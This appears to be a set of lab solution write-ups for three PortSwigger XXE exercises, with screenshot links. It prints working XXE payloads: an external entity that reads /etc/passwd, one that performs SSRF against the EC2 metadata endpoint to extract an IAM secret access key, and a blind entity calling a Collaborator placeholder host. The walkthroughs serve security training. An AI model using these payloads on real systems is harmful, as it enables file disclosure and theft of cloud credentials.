**Lab: Exploiting XXE using external entities to retrieve files**

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
Replace the productId number with a reference to the external entity: &xxe;. The response should contain "Invalid product ID:" followed by the contents of the /etc/passwd file.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/4b659553-dd2e-4d5c-841a-1cab3610b62a)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/a68a9acb-e875-4d12-87af-d7e5c8796230)

**Lab: Exploiting XXE to perform SSRF attacks**

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
Replace the productId number with a reference to the external entity: &xxe;. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/d38497ba-f4c7-4125-872a-63a90a358418)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b6f0cd29-de9b-41f8-9496-324addf1e1b4)

**Lab: Blind XXE with out-of-band interaction**

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
Replace the productId number with a reference to the external entity:

&xxe;
Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

